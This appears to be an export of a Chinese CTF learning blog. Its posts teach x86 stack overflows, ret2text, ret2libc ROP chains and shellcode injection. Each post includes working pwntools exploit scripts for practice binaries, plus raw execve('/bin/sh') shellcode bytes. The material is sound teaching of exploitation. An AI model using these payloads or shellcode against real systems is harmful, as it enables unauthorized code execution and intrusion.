    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>我们已经学会了编写单个和两个简单函数的ROP链，在这里我们说一下，编写ROP链多个需要注意的问题</strong><br><strong>之前我们在学习两个函数的ROP时，编写了这样的payload</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339706.png"><br><strong>我们当时没有考虑，参数冲突和栈溢出大小，现在我们来说一说</strong><br><strong>举个例子，如果我们上次学习的两个函数的ROP中没有gets函数，而是read函数我们怎么办，read函数有三个参数，如果我们要像以前一样构建payload，那么read的第二个参数，就会和system的第一个参数冲突，导致无法将system 的第一个参数放在栈上，在编写多个函数的ROP中会遇见这样的问题，如何解决呢？</strong></p><hr><p><strong>我们需要用到某个地址上的代码，这种代码的基本形式为pop*n + ret</strong><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616165524944-784500429.png"><br><strong>运用这些命令就能把参数弹出，有几个参数就用几个pop命令，这里可以使用ROPgadget库来查找这些命令</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339232.png"><br><strong>这样我们就可以对上一次学的’编写两个函数的ROP进行改变，使其变得更合理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>&quot;&quot;&quot;<br>ROPgadget --binary ./ret2libc2 --only &quot;pop|ret&quot;<br>Gadgets information<br>============================================================<br>0x0804861b : pop ebp ; ret<br>0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804839d : pop ebx ; ret<br>0x0804861a : pop edi ; pop ebp ; ret<br>0x08048619 : pop esi ; pop edi ; pop ebp ; ret<br>0x08048386 : ret<br>0x0804848e : ret 0xeac1<br><br>Unique gadgets found: 7<br>&quot;&quot;&quot;<br><br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>pop1_ret = 0x0804861b<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + p32(1)<br>payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)<br>payload += p32(system) + p32(pop1_ret) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这里看一下payload，栈溢出之后控制返回地址为gets，gets的返回地址为pop1_ret，gets的参数的bss段一个地址，在执行完gets后返回pop1_ret执行pop命令使gets的参数出栈，然后执行ret（pop eip）命令，控制EIP为system地址，system也是相同原理</strong></p>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写两个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>学会了编写单个ROP链，今天就进阶一下，学编写俩个函数的ROP链。通过一道例题我们直接上手</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2">附件下载</a><br><strong>首先我们查看保护</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340349.png"></p><p><strong>IDA反编译发现栈溢出</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340701.png"><br><strong>但是没发现&#x2F;bin&#x2F;sh,这是我们就无从下手了，我们要想一个办法创造&#x2F;bin&#x2F;sh这个字符串，我们发现题目有gets函数，那么我们能不能通过gets输入&#x2F;bin&#x2F;sh这个字符串呢，我们来验证一下</strong><br><strong>先通过栈溢出把返回地址覆盖为，gets函数，通过我们以前的学习，我们知道，和gets栈向上两个字就是gets的参数，也即是我们输入参数的地址，这点不理解的可以查一下gets这个函数，我们就不展开了。我们再控制gets的返回地址为system，和system的参数我们不就实现了进入shell了吗，payload如下</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340274.png"><br><strong>对于这里的bss段，可以在网上阅读一下相关知识，这样我们是不是就控制了程序进入shell，大家可以仔细揣摩一下，理解了编写脚本就很简单</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + &quot;junk&quot;<br>payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写单个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是ROP链"><a href="#什么是ROP链" class="headerlink" title="什么是ROP链"></a>什么是ROP链</h2><p><strong>在我初识栈溢出那篇博客已经详细的讲了函数的调用过程（基于X86框架），不了解的可以看一下，没有这个理论基础，是学不好ROP的。现在我们说一下什么是ROP</strong>。</p><p><strong>ROP链就是通过返回地址的修改来完成的编程，调用特定的函数的一种编程模式。我们可以联想一下你做的最简单的栈溢出的题，返回地址覆盖system（&#x2F;bin&#x2F;sh）。这种也是一种ROP链，只是最简单的一种，所以说ROP也没有那么高端，说白了就是控制返回地址，控制参数。这篇我们来讲一下怎么控制参数</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338766.png"><br><strong>这是一个main函数调用system（&#x2F;bin&#x2F;sh)的栈分布，把func函数的返回地址覆盖为system的地址，这时候system就会作为一个新的函数进入函数内部，开辟栈帧，执行‘push edp；mov edp，esp；sub esp，0x ’。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338135.png"></p><p><strong>根据我们学习函数调用的理论知识，我们可以知道，这时候对于system函数，a就是它的返回地址，b就是它的参数，所以就可以编写脚本控制b的内容来实现控制参数的传入，下面来小试牛刀</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338180.png"></p><p><strong>查看保护，开了地址随机化，开了NX，那我们就不能用Shellcode了，IDA反编译一下，看看怎么个事</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338789.png"></p><p><strong>非常简单的栈溢出，但是没有发现后门函数，所以我们覆盖返回地址为system，传入变量&#x2F;bin&#x2F;sh，shift+F12打开string发现&#x2F;bin&#x2F;sh ，直接编写脚本</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&#x27;./ret2libc1&#x27;)<br>elf = ELF(&#x27;./ret2libc1&#x27;)<br>system_addr = elf.plt[&#x27;system&#x27;]<br>binsh_addr = 0x0804A028<br>p.recvuntil(&#x27;ret2libc1\n&#x27;)<br>payload = 0x108 * b&#x27;a&#x27; + p32(1) + p32(system_addr) + p32(1) + p32(binsh_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode</title>
    <link href="/2024/07/18/Shellcode/"/>
    <url>/2024/07/18/Shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h2><p><strong>Shellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行</strong></p><h2 id="怎么生成Shellcode"><a href="#怎么生成Shellcode" class="headerlink" title="怎么生成Shellcode"></a>怎么生成Shellcode</h2><p><strong>Shellcode的生成方法通常有以下几种：</strong></p><ol><li>在pwntools中由shellcraft模块生成</li><li>在<a href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li><li>通过Metasploit生成</li></ol><h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png"><br>查看保护没有开NX，可以用Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png"><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p><h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png"><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png"><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>从payload起始地址开始构造Shellcode，之后调整esp到Shellcode起始位置</strong>、</p><blockquote><p>为什么要用jmp_esp而不是直接用Shellcode覆盖返回地址？<br>当pop main_addr后esp在main_上边，直接执行sub_esp_jmp在栈外执行，会异常，所以我们要把EIP调整到栈内再把EIP控制到sub_esp_jmp这样就没有问题了</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识栈溢出</title>
    <link href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="认识栈结构"><a href="#认识栈结构" class="headerlink" title="认识栈结构"></a>认识栈结构</h2><p><strong>栈这种结构学过数据结构的都知道，是一种先进后出的结构，类似于子弹放进弹夹一样，先放进的子弹最后打出。</strong></p><h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p><strong>这个知识是整个栈方面的关键知识，我在大一的时候学pwn怎么也学不会，就是忽略了对基础知识的学习，直接学漏洞，一直搞不清怎么回事，非常郁闷。现在详细总结一下函数调用过程，以X86系统为例</strong></p><ol><li><p>压入参数<br><strong>根据调用约定压入参数，main函数作为调用者，首先将fun的参数a,b…压栈。栈是向下生长的，先压入的参数靠近栈顶esp，后压入的靠近栈底edp</strong></p></li><li><p>返回地址压入<br><strong>fun函数调用完成，程序需要返回源地址继续执行程序，那么我们就去要保存调用函数下一句的地址，把它压入栈中，以便我们恢复原程序继续执行</strong></p></li><li><p>fun函数运行<br><strong>fun函数运行会给自己再开辟一个栈，这个栈的栈底就是上个栈的栈顶，因为当调用函数时，执行call命令，会执行这几条汇编‘push edp；mov edp ，esp；sub esp，0x ’这句话可以画图来体会一下。push edp；是为了保存调用函数的栈帧，调用函数结束后要恢复原函数的edp，esp。mov edp ，esp；把esp的值赋值给edp，这样就把新栈帧的栈底确定了。sub esp ，0x，这句话为栈开辟空间，esp就确定了，完成一个新栈开辟</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png"></p></li><li><p>fun函数返回<br><strong>当函数运行完成之后，函数这么返回呢？函数一般会执行‘leave；ret；’这句话什么含义，就是‘mov esp ，edp；pop edp；pop eip’ 我们来解读一下，首先把栈顶移动到栈底，相当于恢复栈顶，仔细想一想，是不是fun调用的时候，把edp移动到esp。然后pop edp 把栈中压入的main_edp弹出赋值给edp，这样我们就恢复了edp，然后再pop eip，把压入的main_addr弹出赋值给eip程序控制流就有回到了call的下一句</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png"></p></li></ol><h3 id="函数调用过程中涉及操作指令"><a href="#函数调用过程中涉及操作指令" class="headerlink" title="函数调用过程中涉及操作指令"></a>函数调用过程中涉及操作指令</h3><ol><li><strong>压栈(push):栈顶指针esp减小4字节;以字节为单位将寄存器数据(4字节，不足补0)压入堆栈，从高到低依次将数据存人esp-1、esp-2、esp-3、esp-4指向的地址单元。</strong></li><li><strong>出栈(pop):栈顶指针esp指向的栈中数据被取回寄存器;栈顶指针esp增加4字节。push和pop指令在不同系统上运行时稍有不同，在64位系统中变化的大小是8字节，在32位系统中变化的大小是4字节。</strong></li><li><strong>调用(ca11):将当前的指令指针eip(该指针指向ca11指令后的下条指令)压入堆栈，以返回时能恢复执行下条指令。然后，设置eip指向被调函数的开始处，以跳转到被调函数的入口地址处执行。</strong></li><li><strong>离开(1eave):恢复主调函数的栈帧以准备返回，它等价于以下指令序列:mov esp，ebp(恢复原esp值，指向被调函数栈帧开始处); pop ebp(恢复原 ebp 的值，即主调函数帧基指针)</strong></li><li><strong>返回(ret):与ca11指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前 ca11指令保存的下条指令地址)到eip寄存器中，程序转到该地址处继续执行(此时 esp指向进人函数时的第一个参数)。若带有立即数，esp要加上立即数(丢弃一些在执行ca11指令前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前ca11指令保存的返回地址。</strong></li></ol><h2 id="初识栈溢出"><a href="#初识栈溢出" class="headerlink" title="初识栈溢出"></a>初识栈溢出</h2><p><strong>当我们调用一个函数的时候，在函数内部存在，栈溢出漏洞，get函数或者开辟空间大于变量距离栈底的位置，那么就可能造成栈溢出，溢出后如果溢出值覆盖了main_addr,函数的返回地址就会变化，我们可以根据这个特点，篡改返回地址到我们想返回的。看下图，距离栈底0x80个字节，但是允许读取0x200个字节，就会造成栈溢出,接下来我们来小试牛刀</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png"><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png"><br><strong>查看保护</strong><br><strong>打开IDA反编译看看代码逻辑</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png"><br><strong>这里有两种判断偏移的方式</strong></p><ol><li><p>第一种就是看图片上红框部分，显示s距离ebp为0x108个字节所以需要填充0x108+0x4个字节的数据才能覆盖返回地址</p></li><li><p>使用pwngdb中cyclic判断偏移，在call gets处下断点，用gdb调试<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png"><br> 用cyclic生成有规律的字符串，输入c把字符串输入运行<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png"><br> 得到一个异常返回地址，程序停止<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png"><br> 用命令cyclic -l 加返回地址算出偏移<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png"><br> <strong>这里的到的偏移就不用算edp的大小了，因为已经包括edp了</strong><br> <strong>有了偏移我们找一下后门函数</strong></p></li></ol><p>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png"><br>  <strong>这题也算很仁慈，直接给出了后门函数，我们随着学习的深入，一般不会直接给出后门函数，需要使用各种技巧来进入shell</strong><br>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png"><br>  <strong>接下来开始编写脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
